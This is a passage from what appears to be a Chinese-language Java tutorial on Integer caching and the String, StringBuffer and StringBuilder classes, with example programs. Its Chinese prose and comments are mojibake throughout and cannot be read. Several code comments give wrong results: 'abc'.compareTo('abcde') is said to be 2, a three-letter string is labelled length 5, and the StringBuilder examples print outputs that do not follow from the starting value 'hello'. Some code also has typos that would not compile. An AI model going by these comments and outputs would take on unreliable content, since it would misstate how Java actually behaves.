{\n\t\tif (i >= IntegerCache.low && i <= IntegerCache.high)\n\t\t\t\treturn IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n\n\n//1. å¦‚æœ i åœ¨IntegerCache.low(-128)~IntegerCache.high(127),å°±ç›´æ¥ä»cacheæ•°ç»„è¿”å›\n//2. å¦‚æœä¸åœ¨ -128~127,å°±ç›´æ¥ new Integer(i)\n```\n\nåŒ…è£…ç±»æ¯”è¾ƒå¤§å°çš„æ—¶å€™æœ‰å¾ˆå¤šå‘ï¼Œæ¯”å¦‚ï¼š == æ¯”è¾ƒå¼•ç”¨ï¼ŒInteger ç±»å‹åªæœ‰åœ¨ -128 åˆ° 127 çš„èŒƒå›´å†…ï¼Œæ‰ä¼šæŒæœ‰åŒä¸€ä¸ªå¼•ç”¨ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ `equals()` ä»£æ›¿ `==` æ¥æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰ã€‚equals æ–¹æ³•ä¼šå…ˆæ¯”è¾ƒç±»å‹æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´ç›´æ¥ falseã€‚\n\n## Stringç±»\n\n### ç®€ä»‹\n\n1) Stringå¯¹è±¡ç”¨äºä¿å­˜å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯ä¸€ç»„å­—ç¬¦åºåˆ—\n2) å­—ç¬¦ä¸²å¸¸é‡å¯¹è±¡æ˜¯ç”¨åŒå¼•å·æ‹¬èµ·çš„å­—ç¬¦åºåˆ—ã€‚ä¾‹å¦‚: \"ä½ å¥½â€ã€ \"12.97\"ã€ \"boy\"ç­‰\n3) å­—ç¬¦ä¸²çš„å­—ç¬¦ä½¿ç”¨Unicodeå­—ç¬¦ç¼–ç ï¼Œä¸€ä¸ªå­—ç¬¦(ä¸åŒºåˆ†å­—æ¯è¿˜æ˜¯æ±‰å­—)å ä¸¤ä¸ªå­—èŠ‚ã€‚\n4) Stringç±»è¾ƒå¸¸ç”¨æ„é€ å™¨ï¼š\n  - String s1 = new String();\n  - String s2 = new String(String original);\n  - String s3 = new String(char[] a);\n  - String s4 = new String(char[] a,int startIndex,int count)\n\n5. String ç±»å®ç°äº†æ¥å£ Serializable å’Œ Comparable\n\n   - æ¥å£ Serializable [String å¯ä»¥ä¸²è¡ŒåŒ–:å¯ä»¥åœ¨ç½‘ç»œä¼ è¾“]\n\n   - æ¥å£ Comparable [String å¯¹è±¡å¯ä»¥æ¯”è¾ƒå¤§å°]\n\n6. String æ˜¯ final ç±»ï¼Œä¸èƒ½è¢«å…¶ä»–çš„ç±»ç»§æ‰¿\n\n7. String ç±»æœ‰å±æ€§ private final char value[]; ç”¨äºå­˜æ”¾å­—ç¬¦ä¸²å†…å®¹\n\n8.  char value[] æ˜¯ä¸€ä¸ª final ç±»å‹ï¼Œ ä¸å¯ä»¥ä¿®æ”¹(ä¸å¯ä»¥ä¿®æ”¹åœ°å€)ï¼šå³ value ä¸èƒ½æŒ‡å‘æ–°çš„åœ°å€ï¼Œä½†æ˜¯å•ä¸ªå­—ç¬¦å†…å®¹æ˜¯å¯ä»¥å˜åŒ–\n\n   ```java\n   String name = \"jack\";\n   name = \"tom\";//å¯ä»¥\n   //String name=\"jackâ€ï¼Œæ˜¯nameæŒ‡å‘ä¸€ä¸ªchar[] value,é‡Œé¢å­˜çš„æ˜¯â€œjackâ€ï¼›\n   //æ¥ç€name=\"tom\",æ˜¯å¦å¤–å£°æ˜äº†ä¸€ä¸ªchar[] valueï¼Œvalueé‡Œé¢å†…å®¹æ˜¯â€tomâ€œ,ç„¶åå°†nameè¿™ä¸ªå¼•ç”¨æŒ‡å‘å†…å®¹ä¸º â€tomâ€œè¿™ä¸ªvalueã€‚\n   \n   \n   final char[] value = {'a','b','c'};\n   value[0] = 'H';//å¯ä»¥\n   char[] value2 = {'t','o','m'};\n   //value = v2; ä¸å¯ä»¥ä¿®æ”¹valueåœ°å€\n   ```\n\n### åˆ›å»ºStringå¯¹è±¡\n\n- æ–¹å¼ä¸€ï¼šç›´æ¥èµ‹å€¼ String s = \"jianjian\";\n\n- æ–¹å¼äºŒï¼šè°ƒç”¨æ„é€ å™¨ String s = new String(\"jianjain\"); \n\n### **ä¸¤ç§åˆ›å»ºStringå¯¹è±¡çš„åŒºåˆ«**\n\n- æ–¹å¼ä¸€ï¼š\n  - å…ˆä»å¸¸é‡æ± æŸ¥çœ‹æ˜¯å¦æœ‰ \"jianjain\" æ•°æ®ç©ºé—´ï¼Œ\n  - å¦‚æœå¸¸é‡æ± æœ‰ï¼Œç›´æ¥æŒ‡å‘ï¼›å¦‚æœå¸¸é‡æ± æ²¡æœ‰åˆ™åˆ›å»ºï¼Œç„¶åæŒ‡å‘ã€‚\n  - s æœ€ç»ˆæŒ‡å‘çš„æ˜¯å¸¸é‡æ± çš„ç©ºé—´åœ°å€\n- æ–¹å¼äºŒ:\n  - å…ˆåœ¨å †ä¸­åˆ›å»ºç©ºé—´ï¼Œé‡Œé¢ç»´æŠ¤äº† value å±æ€§ï¼ŒæŒ‡å‘å¸¸é‡æ± çš„ \"jianjian\" ç©ºé—´ã€‚\n  - å¦‚æœå¸¸é‡æ± æœ‰ï¼Œç›´æ¥é€šè¿‡ value æŒ‡å‘ï¼Œå¦‚æœå¸¸é‡æ± æ²¡æœ‰åˆ™åˆ›å»ºï¼Œç„¶åæŒ‡å‘ã€‚\n  - S æœ€ç»ˆæŒ‡å‘çš„æ˜¯å †ä¸­çš„ç©ºé—´åœ°å€ã€‚\n\n![](https://img.jwt1399.top/img/image-20220315220819135.png)\n\n**ç»ƒä¹ **\n\n```java\nString a = \"abc\";\nString b = \"abc\";\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a==b);//T\n\nString a = new String(\"abc\");\nString b = new String(\"abc\");\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a == b);//F\n                      \nString a = \"abc\";//aæŒ‡å‘å¸¸é‡æ± çš„\"abc\"\nString b = new String(\"abc\");//bæŒ‡å‘å †ä¸­å¯¹è±¡\nSystem.out.println(a.equals(b));//T\nSystem.out.println(a==b);//F\nSystem.out.println(a==b.intern());//T\nSystem.out.println(b==b.intern());//F\n//intern()æ–¹æ³•è¿”å›çš„æ˜¯æœ€ç»ˆå¸¸é‡æ± çš„åœ°å€(å¯¹è±¡)\n                                      \nString s1 = \"jianjian\"; //æŒ‡å‘å¸¸é‡æ± çš„\"jianjian\"\nString s2 = \"java\"; //æŒ‡å‘å¸¸é‡æ± çš„\"java\"\nString s4 = \"java\";//æŒ‡å‘å¸¸é‡æ± çš„\"java\"\nString s3 = new String(\"java\")//æŒ‡å‘å †ä¸­å¯¹è±¡\nSystem.out.println(s2==s3);//F\nSystem.out.println(s2==s4); //T\nSystem.out.println(s2.equals(s3));//T\nSystem.out.println(s1==s2); //F\n                                      \nPerson p1 = new Person();\np1.name = \"jianjian\";\nPerson p2 = new Person();\np2.name = \"jianjian\";\nSystem.out.println(p1.name.equals(p2.name)):// True\nSystem.out.println(p1.name == p2.name); //T\nSystem.out.println(p1.name == \"jianjian\"); //T\n\nString s1 = new String(\"bcde\");\nString s2 = new String(\"bcde\");\nSystem.out.println(s1 == s2); //F\n```\n\n### String ç±»çš„å¸¸è§æ–¹æ³•\n\n- â‘ equals //åŒºåˆ†å¤§å°å†™ï¼Œåˆ¤æ–­å†…å®¹æ˜¯å¦ç›¸ç­‰\n- â‘¡equalsIgnoreCase //å¿½ç•¥å¤§å°å†™çš„åˆ¤æ–­å†…å®¹æ˜¯å¦ç›¸ç­‰\n- â‘¢length //è·å–å­—ç¬¦çš„ä¸ªæ•°ï¼Œå­—ç¬¦ä¸²çš„é•¿åº¦\n- â‘£indexOf //è·å–å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬1æ¬¡å‡ºç°çš„ç´¢å¼•,ç´¢å¼•ä»0å¼€å§‹ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å›-1\n- â‘¤lastIndexOf //è·å–å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­æœ€å1æ¬¡å‡ºç°çš„ç´¢å¼•,ç´¢å¼•ä»å¼€å§‹,å¦‚æ‰¾ä¸åˆ°ï¼Œè¿”å›-1\n- â‘¥substring //æˆªå–æŒ‡å®šèŒƒå›´çš„å­ä¸²\n- â‘¦trim //å»å‰åç©ºæ ¼\n- â‘§charAt //è·å–æŸç´¢å¼•å¤„çš„å­—ç¬¦ï¼Œæ³¨æ„ä¸èƒ½ä½¿ç”¨Str[index]è¿™ç§æ–¹å¼\n\n```java\npackage com.string_;\n\npublic class StringMethod01 {\n    public static void main(String[] args) {\n        //1. æ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸åŒï¼ŒåŒºåˆ†å¤§å°å†™\n        String str1 = \"hello\";\n        String str2 = \"Hello\";\n        System.out.println(str1.equals(str2));\n        // 2.equalsIgnoreCase å¿½ç•¥å¤§å°å†™çš„åˆ¤æ–­å†…å®¹æ˜¯å¦ç›¸ç­‰\n        String username = \"johN\";\n        if (\"john\".equalsIgnoreCase(username)) {\n            System.out.println(\"Success!\");\n        } else {\n            System.out.println(\"Failure!\");\n        }\n        // 3.length è·å–å­—ç¬¦çš„ä¸ªæ•°ï¼Œå­—ç¬¦ä¸²çš„é•¿åº¦\n        System.out.println(\"jian\".length());\n        // 4.indexOf è·å–å­—ç¬¦åœ¨å­—ç¬¦ä¸²å¯¹è±¡ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œç´¢å¼•ä»0 å¼€å§‹ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å›-1\n        String s1 = \"wer@terwe@g\";\n        int index = s1.indexOf('@');\n        System.out.println(index);// 3\n        // 5.lastIndexOf è·å–å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œç´¢å¼•ä»0 å¼€å§‹ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œè¿”å›-1\n        s1 = \"wer@terwe@g@\";\n        index = s1.lastIndexOf('@');\n        System.out.println(index);//11\n        // 6.substring æˆªå–æŒ‡å®šèŒƒå›´çš„å­ä¸²\n        String name = \"hello,å¼ ä¸‰\";\n        //ä¸‹é¢name.substring(6) ä»ç´¢å¼•6å¼€å§‹æˆªå–åé¢æ‰€æœ‰çš„å†…å®¹\n        System.out.println(name.substring(6));//æˆªå–åé¢çš„å­—ç¬¦\n        //name.substring(2,5)è¡¨ç¤ºä»ç´¢å¼•2å¼€å§‹æˆªå–ï¼Œæˆªå–åˆ°ç´¢å¼•5-1=4 ä½ç½®\n        System.out.println(name.substring(2,5));//llo\n      \t//7.trim å»å‰åç©ºæ ¼\n        s1 = \" jianjian \";\n        System.out.println(s1.trim());//\"jianjian\"\n        System.out.println(s1);//\" jianjian \"\n        //8.charAt è·å–æŸç´¢å¼•å¤„çš„å­—ç¬¦ï¼Œæ³¨æ„ä¸èƒ½ä½¿ç”¨Str[index]è¿™ç§æ–¹å¼\n        s1 = \"jianjian\";\n        System.out.println(s1.charAt(0));\n    }\n}\n```\n\n- â‘ toUpperCase //è½¬æ¢æˆå¤§å†™\n- â‘¡toLowerCase //è½¬æ¢æˆå°å†™\n- â‘¢concat //æ‹¼æ¥å­—ç¬¦ä¸²\n- â‘£replace //æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦\n- â‘¤split //åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå¯¹äºæŸäº›åˆ†å‰²å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦è½¬ä¹‰æ¯”å¦‚/ã€\\\\ç­‰\n- â‘¥compareTo //æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°\n- â‘¦toCharArray //è½¬æ¢æˆå­—ç¬¦æ•°ç»„\n- â‘§format //æ ¼å¼å­—ç¬¦ä¸²ï¼Œ\n  - %så­—ç¬¦ä¸² \n  - %cå­—ç¬¦\n  - %dæ•´å‹\n  - %.2fæµ®ç‚¹å‹\n\n```java\npackage com.string_;\n\npublic class StringMethod02 {\n    public static void main(String[] args) {\n        // 1.toUpperCase è½¬æ¢æˆå¤§å†™\n        String s = \"heLLo\";\n        System.out.println(s.toUpperCase());//HELLO\n        // 2.toLowerCase è½¬æ¢æˆå°å†™\n        System.out.println(s.toLowerCase());//hello\n        // 3.concat æ‹¼æ¥å­—ç¬¦ä¸²\n        String s1 = \"å®ç‰\";\n        s1 = s1.concat(\"æ—é»›ç‰\").concat(\"è–›å®é’—\");\n        System.out.println(s1);//å®ç‰æ—é»›ç‰è–›å®é’—\n        // 4.replace æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦\n        s1 = \"å®ç‰æ—é»›ç‰æ—é»›ç‰æ—é»›ç‰\";\n        //s1.replace() æ–¹æ³•æ‰§è¡Œåï¼Œè¿”å›çš„ç»“æœæ‰æ˜¯æ›¿æ¢è¿‡çš„ï¼Œæ³¨æ„å¯¹s1 æ²¡æœ‰ä»»ä½•å½±å“\n        String s11 = s1.replace(\"å®ç‰\", \"æ—é»›ç‰\");\n        System.out.println(s1);//å®ç‰æ—é»›ç‰æ—é»›ç‰æ—é»›ç‰\n        System.out.println(s11);//æ—é»›ç‰æ—é»›ç‰æ—é»›ç‰æ—é»›ç‰\n        // 5.split åˆ†å‰²å­—ç¬¦ä¸², å¯¹äºæŸäº›åˆ†å‰²å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦è½¬ä¹‰æ¯”å¦‚| \\\\ç­‰\n        String poem = \"é”„ç¦¾æ—¥å½“åˆ,æ±—æ»´ç¦¾ä¸‹åœŸ,è°çŸ¥ç›˜ä¸­é¤,ç²’ç²’çš†è¾›è‹¦\";\n        // ä»¥, ä¸ºæ ‡å‡†å¯¹poem è¿›è¡Œåˆ†å‰², è¿”å›ä¸€ä¸ªæ•°ç»„\n        // åœ¨å¯¹å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²æ—¶ï¼Œå¦‚æœæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦åŠ å…¥è½¬ä¹‰ç¬¦\\\n        String[] split = poem.split(\",\");\n        System.out.println(\"==åˆ†å‰²åå†…å®¹===\");\n        for (int i = 0; i < split.length; i++) {\n            System.out.println(split[i]);\n        }\n\n        poem = \"E:\\\\aaa\\\\bbb\";\n        split = poem.split(\"\\\\\\\\\");\n        System.out.println(\"==åˆ†å‰²åå†…å®¹===\");\n        for (int i = 0; i < split.length; i++) {\n            System.out.println(split[i]);\n        }\n        // 6.toCharArray è½¬æ¢æˆå­—ç¬¦æ•°ç»„\n        s = \"happy\";\n        char[] chs = s.toCharArray();\n        for (int i = 0; i < chs.length; i++) {\n            System.out.println(chs[i]);\n        }\n        // 7.compareTo æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°\n        // å¦‚æœå‰è€…å¤§ï¼Œåˆ™è¿”å›æ­£æ•°ï¼Œåè€…å¤§ï¼Œåˆ™è¿”å›è´Ÿæ•°ï¼Œå¦‚æœç›¸ç­‰ï¼Œè¿”å›0\n        // (1) å¦‚æœé•¿åº¦ç›¸åŒï¼Œå¹¶ä¸”æ¯ä¸ªå­—ç¬¦ä¹Ÿç›¸åŒï¼Œå°±è¿”å›0\n        String a1 = \"abc\";\n        String b1 = \"abc\";\n        System.out.println(a1.compareTo(b1)); // è¿”å›å€¼æ˜¯0\n        // (2) å¦‚æœé•¿åº¦ç›¸åŒï¼Œå­—ç¬¦ä¸åŒï¼Œè¿”å›str1 - str2\n        String a2 = \"acc\";// len = 3\n        String b2 = \"aac\";// len = 5\n        System.out.println(a2.compareTo(b2)); // è¿”å›å€¼æ˜¯'c' - 'a' = 2 çš„å€¼\n        // (3) å¦‚æœé•¿åº¦ä¸ç›¸åŒä¸”å‰éƒ¨åˆ†ç›¸åŒï¼Œå°±è¿”å›str1.len - str2.len\n        String a3 = \"abc\";// len = 3\n        String b3 = \"abcde\";// len = 5\n        System.out.println(a3.compareTo(b3)); // è¿”å›å€¼æ˜¯3-5=2\n        //(4) å¦‚æœé•¿åº¦ä¸ç›¸åŒä¸”å‰éƒ¨åˆ†ä¸ç›¸åŒï¼Œå°±è¿”å›str1 - str2\n        String a4 = \"bac\";// len = 3\n        String b4 = \"abcde\";// len = 5\n        System.out.println(a4.compareTo(b4)); // è¿”å›å€¼æ˜¯ 'b'-'a'=1\n        // 8.format æ ¼å¼å­—ç¬¦ä¸²\n        String name = \"john\";\n        int age = 10;\n        double score = 56.857;\n        char gender = 'ç”·';\n        //å°†æ‰€æœ‰çš„ä¿¡æ¯éƒ½æ‹¼æ¥åœ¨ä¸€ä¸ªå­—ç¬¦ä¸².\n        String info = \"æˆ‘çš„å§“åæ˜¯\" + name + \"ï¼Œå¹´é¾„æ˜¯\" + age + \"ï¼Œæˆç»©æ˜¯\" + score + \"ï¼Œæ€§åˆ«æ˜¯\" + gender + \"ï¼Œå¸Œæœ›å¤§å®¶å–œæ¬¢æˆ‘ï¼ \";\n        System.out.println(info);\n        String formatStr = \"æˆ‘çš„å§“åæ˜¯%s ï¼Œå¹´é¾„æ˜¯%dï¼Œæˆç»©æ˜¯%.2fï¼Œæ€§åˆ«æ˜¯%cï¼Œå¸Œæœ›å¤§å®¶å–œæ¬¢æˆ‘ï¼\";\n        String info2 = String.format(formatStr, name, age, score, gender);\n        System.out.println(\"info2=\" + info2);\n    }\n}\n```\n\n## StringBufferç±»\n\n### ç®€ä»‹\n\nStringBuffer ä»£è¡¨å¯å˜çš„å­—ç¬¦åºåˆ—ï¼Œå¯ä»¥å¯¹å­—ç¬¦ä¸²å†…å®¹è¿›è¡Œå¢åˆ ã€‚StringBufferæ˜¯ä¸€ä¸ªå®¹å™¨ã€‚\n\n**åˆ›å»ºStringBufferå¯¹è±¡**\n\n```java\nStringBuffer stringBuffer = new StringBuffer(\"hello\");\n```\n\n- 1. StringBuffer çš„ç›´æ¥çˆ¶ç±»æ˜¯ AbstractStringBuilder\n\n- 2. StringBuffer å®ç°äº†Serializable, å³ StringBuffer çš„å¯¹è±¡å¯ä»¥ä¸²è¡ŒåŒ–\n\n- 3. åœ¨çˆ¶ç±»ä¸­ AbstractStringBuilder æœ‰å±æ€§ char[] valueï¼Œä¸æ˜¯finalï¼Œè¯¥ value æ•°ç»„å­˜æ”¾å­—ç¬¦ä¸²å†…å®¹ï¼Œæ•°ç»„å­˜æ”¾åœ¨å †ä¸­çš„\n\n- 4. StringBuffer æ˜¯ä¸€ä¸ª final ç±»ï¼Œä¸èƒ½è¢«ç»§æ‰¿\n\n- 5. å› ä¸º StringBuffer å­—ç¬¦å†…å®¹æ˜¯å­˜å‚¨åœ¨ char[] value, æ‰€æœ‰åœ¨å˜åŒ–(å¢åŠ /åˆ é™¤)ï¼Œä¸ç”¨æ¯æ¬¡éƒ½æ›´æ¢åœ°å€(å³ä¸æ˜¯æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡)ï¼Œ æ‰€ä»¥æ•ˆç‡é«˜äº String\n\n### String & StringBuffer\n\n- String ä¿å­˜çš„æ˜¯å­—ç¬¦ä¸²å¸¸é‡ï¼Œé‡Œé¢çš„å€¼ä¸èƒ½æ›´æ”¹ï¼Œæ¯æ¬¡ String ç±»çš„æ›´æ–°å®é™…ä¸Šå°±æ˜¯æ–°å»ºå¯¹è±¡æ›´æ”¹åœ°å€ï¼Œæ•ˆç‡è¾ƒä½\n\n  - private final char value[];//æ”¾åœ¨å¸¸é‡æ± \n\n- StringBuffer ä¿å­˜çš„æ˜¯å­—ç¬¦ä¸²å˜é‡ï¼Œé‡Œé¢çš„å€¼å¯ä»¥æ›´æ”¹ï¼Œæ¯æ¬¡ StringBuffer çš„æ›´æ–°å®é™…ä¸Šå¯ä»¥æ›´æ–°å†…å®¹ï¼Œä¸ç”¨æ¯æ¬¡æ›´æ–°åœ°å€ï¼Œæ•ˆç‡è¾ƒé«˜\n\n  - char[] value; // æ”¾åœ¨å †ä¸­\n\n  - ```java\n    //StringBufferæ„é€ å™¨æºç \n    //æ„é€ æ—¶é»˜è®¤åˆ›å»ºé•¿åº¦ä¸º16çš„ char[] æ•°ç»„\n    public StringBuffer(String str) {\n    super(str.length() + 16);\n    append(str);\n    }\n    ```\n\n### Stringå’ŒStringBufferè½¬æ¢\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringAndStringBuffer {\n    public static void main(String[] args) {\n        //Stringâ€”â€”>StringBuffer\n        String str = \"hello tom\";\n        //æ–¹å¼1 ä½¿ç”¨æ„é€ å™¨\n        //æ³¨æ„ï¼š è¿”å›çš„æ‰æ˜¯StringBuffer å¯¹è±¡ï¼Œå¯¹str æœ¬èº«æ²¡æœ‰å½±å“\n        StringBuffer stringBuffer1 = new StringBuffer(str);\n        //æ–¹å¼2 ä½¿ç”¨çš„æ˜¯append æ–¹æ³•\n        StringBuffer stringBuffer2 = new StringBuffer();\n        stringBuffer2 = stringBuffer2.append(str);\n        \n        //StringBuffer ->String\n        StringBuffer stringBuffer3 = new StringBuffer(\"æµ‹è¯•\");\n        //æ–¹å¼1 ä½¿ç”¨StringBuffer æä¾›çš„toString æ–¹æ³•\n        String s = stringBuffer3.toString();\n        //æ–¹å¼2: ä½¿ç”¨æ„é€ å™¨æ¥æå®š\n        String s1 = new String(stringBuffer3);\n    }\n}\n```\n\n### StringBufferç±»å¸¸è§æ–¹æ³•\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringBufferMethod {\n    public static void main(String[] args) {\n        \n        StringBuffer s = new StringBuffer(\"hello\");\n        //å¢\n        s.append(',');// \"hello,\"\n        s.append(\"å¼ ä¸‰ä¸°\");//\"hello,å¼ ä¸‰ä¸°\"\n        s.append(\"èµµæ•\").append(100).append(true).append(10.5);//\"hello,å¼ ä¸‰ä¸°èµµæ•100true10.5\"\n        System.out.println(s);//\"hello,å¼ ä¸‰ä¸°èµµæ•100true10.5\"\n        //åˆ \n        s.delete(11, 14);//åˆ é™¤[11, 14)çš„å­—ç¬¦\n        System.out.println(s);//\"hello,å¼ ä¸‰ä¸°èµµæ•true10.5\"\n        //æ”¹\n        s.replace(9, 11, \"å‘¨èŠ·è‹¥\"); //ä½¿ç”¨å‘¨èŠ·è‹¥æ›¿æ¢ç´¢å¼•[9,11)çš„å­—ç¬¦\n        System.out.println(s);//\"hello,å¼ ä¸‰ä¸°å‘¨èŠ·è‹¥true10.5\"\n        //æŸ¥æ‰¾\n        int indexOf = s.indexOf(\"å¼ ä¸‰ä¸°\");//æŸ¥æ‰¾æŒ‡å®šçš„å­ä¸²åœ¨å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼•ï¼Œå¦‚æœæ‰¾ä¸åˆ°è¿”å›-1\n        System.out.println(indexOf);//6\n        //æ’\n        s.insert(9, \"èµµæ•\");//åœ¨ç´¢å¼•ä¸º9 çš„ä½ç½®æ’å…¥\"èµµæ•\"\n        System.out.println(s);//\"hello,å¼ ä¸‰ä¸°èµµæ•å‘¨èŠ·è‹¥true10.5\"\n        //é•¿åº¦\n        System.out.println(s.length());//22\n        System.out.println(s);\n    }\n}\n```\n\n## StringBuilder ç±»\n\n### ç®€ä»‹\n\nStringBuilder æ˜¯ä¸€ä¸ªå¯å˜çš„å­—ç¬¦ä¸²ç±»ï¼ŒStringBuilderå†…å®¹æ˜¯å¯å˜çš„\n\n- æ­¤ç±»æä¾›ä¸€ä¸ªä¸ StringBuffer å…¼å®¹çš„APIï¼Œä½†ä¸ä¿è¯åŒæ­¥(StringBuilderä¸æ˜¯çº¿ç¨‹å®‰å…¨)ã€‚è¯¥ç±»è¢«è®¾è®¡ç”¨ä½œ StringBuffer çš„ä¸€ä¸ªç®€æ˜“æ›¿æ¢ï¼Œç”¨åœ¨å­—ç¬¦ä¸²ç¼“å†²åŒºè¢«å•ä¸ªçº¿ç¨‹ä½¿ç”¨çš„æ—¶å€™ã€‚å¦‚æœå¯èƒ½ï¼Œå»ºè®®ä¼˜å…ˆé‡‡ç”¨è¯¥ç±»å› ä¸ºåœ¨å¤§å¤šæ•°å®ç°ä¸­ï¼Œå®ƒæ¯” StringBuffer è¦å¿«ã€‚\n- åœ¨ StringBuilder ä¸Šçš„ä¸»è¦æ“ä½œæ˜¯ append å’Œ insert æ–¹æ³•ï¼Œå¯é‡è½½è¿™äº›æ–¹æ³•ï¼Œä»¥æ¥å—ä»»æ„ç±»å‹çš„æ•°æ®ã€‚\n\n### **åˆ›å»ºStringbuilderå¯¹è±¡**\n\n```java\nStringBuilder strB = new StringBuilder(\"hello\");\n```\n\n**1ã€append(String str)/append(Char c)ï¼šå­—ç¬¦ä¸²è¿æ¥**\n\n```java\nSystem.out.println(\"StringBuilder:\"+strB.append(\"ch\").append(\"111\").append('c'));\n//return \"StringBuilder:ch111c\"\n```\n\n**2ã€toString()ï¼šæŠŠStringbuilderè½¬æ¢ä¸ºStringè¾“å‡º**\n\n```java\nSystem.out.println(\"String:\"+strB.toString());\n//return \"String:ch111c\"\n```\n\n**3ã€appendcodePoint(int cp)ï¼šè¿½åŠ ä¸€ä¸ªä»£ç ç‚¹ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºä¸€ä¸ªæˆ–ä¸¤ä¸ªä»£ç å•å…ƒå¹¶è¿”å›this**\n\n```java\nSystem.out.println(\"StringBuilder.appendCodePoint:\"+strB.appendCodePoint(2));\n//return \"StringBuilder.appendCodePoint:ch111c\"\n```\n\n**4ã€setCharAt(int i, char c)ï¼šå°†ç¬¬ i ä¸ªä»£ç å•å…ƒè®¾ç½®ä¸º cï¼ˆå¯ä»¥ç†è§£ä¸ºæ›¿æ¢ï¼‰**\n\n```java\nstrB.setCharAt(2, 'd');\nSystem.out.println(\"StringBuilder.setCharAt:\" + strB);\n//return \"StringBuilder.setCharAt:chd11c\"\n```\n\n**5ã€insert(int offset, String str)/insert(int offset, Char c)ï¼šåœ¨æŒ‡å®šä½ç½®ä¹‹å‰æ’å…¥å­—ç¬¦(ä¸²)**\n\n```java\nSystem.out.println(\"StringBuilder.insertString:\"+ strB.insert(2, \"LS\"));\n//return \"StringBuilder.insertString:chLSd11c\"\nSystem.out.println(\"StringBuilder.insertChar:\"+ strB.insert(2, 'L'));\n//return \"StringBuilder.insertChar:chLLSd11c\"\n```\n\n**6ã€delete(int startIndex,int endIndex)ï¼šåˆ é™¤èµ·å§‹ä½ç½®ï¼ˆå«ï¼‰åˆ°ç»“å°¾ä½ç½®ï¼ˆä¸å«ï¼‰ä¹‹é—´çš„å­—ç¬¦ä¸²**\n\n```java\nSystem.out.println(\"StringBuilder.delete:\"+ strB.delete(2, 4));\n//return \"StringBuilder.delete:chSd11c\"\n```\n\n## Stringç±»æ¯”è¾ƒ\n\n1) Stringï¼šä¸å¯å˜å­—ç¬¦åºåˆ—ï¼Œæ•ˆç‡ä½ï¼Œä½†æ˜¯å¤ç”¨ç‡é«˜ã€‚\n2) StringBufferï¼šå¯å˜å­—ç¬¦åºåˆ—ã€æ•ˆç‡è¾ƒé«˜(å¢åˆ )ã€çº¿ç¨‹å®‰å…¨\n3) StringBuilderï¼šå¯å˜å­—ç¬¦åºåˆ—ã€æ•ˆç‡æœ€é«˜ã€çº¿ç¨‹ä¸å®‰å…¨\n\nStringä½¿ç”¨æ³¨æ„è¯´æ˜ï¼š\n\n- ```java\n  string s = \"a\"; //åˆ›å»ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²\n  s += \"b\"; \n  //å®é™…ä¸ŠåŸæ¥çš„\"a\"å­—ç¬¦ä¸²å¯¹è±¡å·²ç»ä¸¢å¼ƒäº†,ç°åœ¨åˆäº§ç”Ÿäº†ä¸€ä¸ªå­—ç¬¦ä¸² s + \"b\" (ä¹Ÿå°±æ˜¯\"ab\")ã€‚\n  \n  //å¦‚æœå¤šæ¬¡æ‰§è¡Œè¿™äº›æ”¹å˜ä¸²å†…å®¹çš„æ“ä½œï¼Œä¼šå¯¼è‡´å¤§é‡å‰¯æœ¬å®‡ç¬¦ä¸²å¯¹è±¡å­˜ç•™åœ¨å†…å­˜ä¸­ï¼Œé™ä½æ•ˆç‡ã€‚\n  //å¦‚æœè¿™æ ·çš„æ“ä½œæ”¾åˆ°å¾ªç¯ä¸­ï¼Œä¼šæå¤§å½±å“ç¨‹åºçš„æ€§èƒ½\n  //ç»“è®º:å¦‚æœæˆ‘ä»¬å¯¹Stringåšå¤§é‡ä¿®æ”¹ï¼Œä¸è¦ä½¿ç”¨String\n  ```\n\n**Stringã€StringBufferã€StringBuilder æ•ˆç‡**\n\n-  StringBuilder > StringBuffer > String\n\n```java\npackage com.jwt.stringbuffer_;\n\npublic class StringVsStringBufferVsStringBuilder {\n    public static void main(String[] args) {\n\n        long startTime = 0L;\n        long endTime = 0L;\n        StringBuffer buffer = new StringBuffer(\"\");\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//StringBuffer æ‹¼æ¥80000 æ¬¡\n            buffer.append(String.valueOf(i));\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"StringBuffer çš„æ‰§è¡Œæ—¶é—´ï¼š\" + (endTime - startTime) + \"ms\");\n\n\n        StringBuilder builder = new StringBuilder(\"\");\n        startTime = System.currentTimeMillis();\n        for (int i = 0; i < 80000; i++) {//StringBuilder æ‹¼æ¥80000 æ¬¡\n            builder.append(String.valueOf(i));\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(\"StringBuilder 